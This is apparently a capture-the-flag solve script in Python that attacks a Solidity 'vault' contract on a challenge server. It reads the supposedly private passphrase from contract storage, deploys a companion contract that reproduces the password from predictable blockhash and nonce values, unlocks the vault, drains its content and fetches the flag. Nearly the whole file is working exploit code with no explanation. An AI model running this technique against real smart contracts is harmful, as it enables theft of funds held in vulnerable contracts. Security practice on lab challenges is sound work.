from web3 import Web3
from solcx import compile_source, install_solc, set_solc_version
import requests

install_solc('0.8.13')
set_solc_version('0.8.13')

# Get connection info from endpoint
BASE_URL = "http://94.237.55.98:35563"

print("Getting connection info...")
response = requests.get(f"{BASE_URL}/connection_info", timeout=5)
if response.status_code != 200:
    print("Failed to get connection info")
    exit(1)

conn_info = response.json()
RPC_URL = f"{BASE_URL}/rpc"
PRIVATE_KEY = conn_info['PrivateKey']
YOUR_ADDRESS = conn_info['Address']
VAULT_ADDRESS = conn_info['TargetAddress']
SETUP_ADDRESS = conn_info['setupAddress']
FLAG_ENDPOINT = f"{BASE_URL}/flag"

w3 = Web3(Web3.HTTPProvider(RPC_URL))

if not w3.is_connected():
    print("Failed to connect")
    exit(1)

code = w3.eth.get_code(VAULT_ADDRESS)
if code == b'' or code == '0x':
    print("Contract not found - instance expired")
    exit(1)

print("Connected to RPC")

passphrase = w3.eth.get_storage_at(VAULT_ADDRESS, 2)

exploit_source = '''
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface IVault {
    function owner() external view returns (address);
    function nonce() external view returns (uint256);
    function unlock(bytes16 _password) external;
    function claimContent() external;
}

contract VaultExploit {
    function _generateKey(uint256 _reductor, uint256 nonce) private view returns (uint256 ret) {
        ret = uint256(keccak256(abi.encodePacked(uint256(blockhash(block.number - _reductor)) + nonce)));
    }
    
    function _magicPassword(uint256 startNonce, bytes32 passphrase) private view returns (bytes8) {
        uint256 _key1 = _generateKey(block.timestamp % 2 + 1, startNonce);
        uint128 _key2 = uint128(_generateKey(2, startNonce + 1));
        bytes8 _secret = bytes8(bytes16(uint128(uint128(bytes16(bytes32(uint256(uint256(passphrase) ^ _key1)))) ^ _key2)));
        return (_secret >> 32 | _secret << 16);
    }
    
    function exploit(address vaultAddress, bytes32 passphrase) external {
        IVault vault = IVault(vaultAddress);
        address owner = vault.owner();
        uint256 currentNonce = vault.nonce();
        
        uint64 ownerLower = uint64(uint160(owner));
        
        bytes8 magicPwd = _magicPassword(currentNonce, passphrase);
        uint128 _secretKey = uint128(bytes16(magicPwd) >> 64);
        uint64 secretLower = uint64(_secretKey);
        
        bytes16 password = bytes16((uint128(ownerLower) << 64) | uint128(secretLower));
        
        vault.unlock(password);
        vault.claimContent();
    }
}
'''

compiled_sol = compile_source(exploit_source, output_values=['abi', 'bin'], solc_version='0.8.13')

contract_interface = None
for contract_name, contract_data in compiled_sol.items():
    if 'VaultExploit' in contract_name:
        contract_interface = contract_data
        break

if not contract_interface:
    print("Could not find VaultExploit")
    exit(1)

bytecode = contract_interface['bin']
abi = contract_interface['abi']

ExploitContract = w3.eth.contract(abi=abi, bytecode=bytecode)

nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
transaction = ExploitContract.constructor().build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 2000000,
    'gasPrice': w3.eth.gas_price
})

signed_txn = w3.eth.account.sign_transaction(transaction, PRIVATE_KEY)
tx_hash = w3.eth.send_raw_transaction(signed_txn.raw_transaction)

tx_receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
exploit_address = tx_receipt.contractAddress

if tx_receipt['status'] != 1:
    print("Deployment failed!")
    exit(1)

print(f"Exploit contract deployed at: {exploit_address}")

exploit_contract = w3.eth.contract(address=exploit_address, abi=abi)

nonce = w3.eth.get_transaction_count(YOUR_ADDRESS)
exploit_txn = exploit_contract.functions.exploit(VAULT_ADDRESS, passphrase).build_transaction({
    'from': YOUR_ADDRESS,
    'nonce': nonce,
    'gas': 500000,
    'gasPrice': w3.eth.gas_price
})

signed_exploit = w3.eth.account.sign_transaction(exploit_txn, PRIVATE_KEY)
exploit_hash = w3.eth.send_raw_transaction(signed_exploit.raw_transaction)

exploit_receipt = w3.eth.wait_for_transaction_receipt(exploit_hash)

if exploit_receipt['status'] != 1:
    print("Exploit failed!")
    exit(1)

print(f"Exploit tx: {exploit_hash.hex()}")
print("Done!")

try:
    response = requests.get(FLAG_ENDPOINT, timeout=5)
    if response.status_code == 200:
        print(f"\nFlag: {response.text}")
except:
    print("\nCouldn't fetch flag from endpoint")
